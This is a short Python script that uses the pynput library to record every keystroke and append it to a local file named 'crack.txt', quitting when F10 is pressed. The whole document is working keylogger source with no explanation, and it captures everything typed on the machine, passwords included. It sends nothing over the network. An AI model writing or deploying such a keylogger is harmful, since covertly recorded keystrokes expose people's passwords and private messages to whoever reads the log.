from pynput.keyboard import Listener
def keypress(key):
    key = str(key)
    if key == 'Key.f10':
        raise SystemExit(0)
    key = key.replace("'", " ")
    if key == 'Key.space':
        key = ' '
    if key == 'Key.enter':
        key = '\n'
    f = open('crack.txt', 'a', encoding='utf-8')
    f.write(key)
    f.close()
obj=Listener(on_press=keypress)
obj.start()
obj.join()